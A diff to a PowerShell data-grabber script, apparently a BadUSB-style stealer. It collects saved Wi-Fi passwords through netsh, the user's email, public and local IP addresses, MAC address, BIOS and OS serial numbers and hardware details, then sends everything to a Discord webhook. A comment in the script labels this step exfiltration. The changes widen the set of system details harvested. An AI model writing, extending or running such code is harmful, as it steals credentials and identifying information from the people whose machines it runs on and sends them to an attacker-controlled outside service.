@@ -65,7 +65,7 @@ $EM = Get-email
 
 ############################################################################################################################################################
 
-# Get nearby wifi networks
+# Get wifi networks
 function Get-WifiPasswords {
     try {
         # Get Wi-Fi profiles using netsh
@@ -135,18 +135,54 @@ try {
 
 ############################################################################################################################################################
 
-#Get System Info
-$computerSystem = Get-CimInstance CIM_ComputerSystem
-$computerBIOS = Get-CimInstance CIM_BIOSElement
+# Get System Information
+try {
+    # Get basic system information
+    $computerSystem = Get-CimInstance CIM_ComputerSystem
+    $computerBIOS = Get-CimInstance CIM_BIOSElement
+    $computerOS = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, CSName, Version, SerialNumber, InstallDate, LastBootUpTime
 
-$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
-$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
-$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
+    # Get CPU information
+    $computerCPU = Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, MaxClockSpeed
 
-$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
+    # Get RAM capacity
+    $computerRamCapacity = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
+    $computerRamCapacity = "{0:N1} GB" -f $computerRamCapacity
 
-############################################################################################################################################################
+    # Get Mainboard information
+    $computerMainboard = Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer, Product
+
+    # Get HDD/SSD information
+    $driveInfo = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID, VolumeName, FileSystem, @{Name="Size (GB)";Expression={"{0:N1}" -f ($_.Size / 1GB)}}, @{Name="Free Space (GB)";Expression={"{0:N1}" -f ($_.FreeSpace / 1GB)}}
+
+} catch {
+    Write-Error "Failed to gather system information"
+}
+
+# Format System Info for Output
+$SystemDetails = @"
+System Manufacturer: $($computerSystem.Manufacturer)
+System Model: $($computerSystem.Model)
+BIOS Serial Number: $($computerBIOS.SerialNumber)
+Operating System: $($computerOS.Caption)
+OS Version: $($computerOS.Version)
+OS Serial Number: $($computerOS.SerialNumber)
+Install Date: $([Management.ManagementDateTimeConverter]::ToDateTime($computerOS.InstallDate))
+Last Boot Time: $([Management.ManagementDateTimeConverter]::ToDateTime($computerOS.LastBootUpTime))
+CPU: $($computerCPU.Name)
+CPU Manufacturer: $($computerCPU.Manufacturer)
+Max Clock Speed: $($computerCPU.MaxClockSpeed) MHz
+RAM Capacity: $computerRamCapacity
+Mainboard Manufacturer: $($computerMainboard.Manufacturer)
+Mainboard Model: $($computerMainboard.Product)
+
+Drives:
+@($driveInfo | Out-String)
+"@
+
+
+
+###########################################################################################################################################################
 
 # Get HDDs
 $driveType = @{
@@ -394,18 +430,17 @@ Public IP: $computerPubIP
 Local IP(s): $localIP
 MAC Address: $MAC
 DHCP Enabled: $IsDHCPEnabled
+
+System Details:
+$SystemDetails
+
 Wi-Fi Passwords:
 $WiFiPasswords
 "@
 
+# Send System Info to Discord
 Send-ToDiscord -Message $SystemInfo
 
-
-# Save Information to File
-$SystemInfo | Out-File -FilePath $OutputFilePath -Encoding UTF8
-
-# Exfiltrate Data to Discord
-Send-ToDiscord -Message $SystemInfo
 
 
 ############################################################################################################################################################
